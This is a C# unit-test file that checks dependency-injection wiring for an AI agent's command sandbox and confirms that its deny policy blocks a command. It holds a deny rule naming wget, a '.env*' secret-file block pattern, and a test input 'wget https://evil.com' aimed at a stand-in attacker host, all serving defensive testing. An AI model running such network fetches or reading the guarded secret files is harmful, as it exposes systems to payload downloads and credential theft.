using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;
using Microsoft.Extensions.Options;

namespace Agent.Sandbox.Tests;

/// <summary>
/// Tests for <see cref="SandboxServiceCollectionExtensions.AddSandboxServices"/> — the public
/// registration path the host uses (and that the host's GitClient / container integration tests
/// resolve through, now that the concrete sandbox types have internal constructors in this library).
/// Confirms every sandbox service resolves to its expected concrete type and that the sandbox is
/// genuinely wired end-to-end through the registered <c>IProcessRunner</c>.
/// </summary>
public sealed class AddSandboxServicesTests
{
    private static ServiceProvider BuildProvider()
    {
        var services = new ServiceCollection();
        services.AddLogging();
        services.AddSingleton<IOptions<WorkspaceOptions>>(Options.Create(new WorkspaceOptions
        {
            RootPath = Path.Combine(Path.GetTempPath(), "add-sandbox-tests"),
            AllowedCommands = ["dotnet", "git"],
        }));
        services.AddSingleton<IOptions<SandboxOptions>>(Options.Create(new SandboxOptions
        {
            DenyPathPatterns = [".env*"],
            AllowedHosts = ["api.github.com"],
            DeniedCommands = [new CommandDenyRule("no-wget", "wget")],
        }));
        services.AddSingleton<IOptions<ContainerRuntimeOptions>>(Options.Create(new ContainerRuntimeOptions()));

        services.AddSandboxServices();

        return services.BuildServiceProvider();
    }

    [Fact]
    public void Registers_command_sandbox_as_CommandSandbox()
    {
        using var provider = BuildProvider();

        provider.GetRequiredService<ICommandSandbox>().Should().BeOfType<CommandSandbox>();
    }

    [Fact]
    public void Registers_container_runtime_as_DockerContainerRuntime()
    {
        using var provider = BuildProvider();

        provider.GetRequiredService<IContainerRuntime>().Should().BeOfType<DockerContainerRuntime>();
    }

    [Fact]
    public void Registers_path_and_command_deny_policies()
    {
        using var provider = BuildProvider();

        provider.GetRequiredService<IPathDenyPolicy>().Should().BeOfType<PathDenyPolicy>();
        provider.GetRequiredService<ICommandDenyPolicy>().Should().BeOfType<CommandDenyPolicy>();
    }

    [Fact]
    public void Registers_HostAllowlistHandler_as_transient()
    {
        using var provider = BuildProvider();

        var first = provider.GetRequiredService<HostAllowlistHandler>();
        var second = provider.GetRequiredService<HostAllowlistHandler>();

        first.Should().NotBeNull();
        second.Should().NotBeSameAs(first, because: "the egress handler is registered transient");
    }

    [Fact]
    public async Task Resolved_sandbox_enforces_the_command_deny_policy_end_to_end()
    {
        using var provider = BuildProvider();
        var sandbox = provider.GetRequiredService<ICommandSandbox>();
        var cwd = Path.Combine(Path.GetTempPath(), "add-sandbox-tests", "repo");

        // wget is denied by the registered rule — the public-path sandbox must reject it
        // before spawning any process, proving the deny policy is wired through DI. A deny hit is
        // recoverable (never executed), so it surfaces as CommandDeniedException.
        var act = async () => await sandbox.RunAsync(
            "wget https://evil.com", cwd, TimeSpan.FromSeconds(5), CancellationToken.None);

        await act.Should().ThrowAsync<CommandDeniedException>();
    }
}
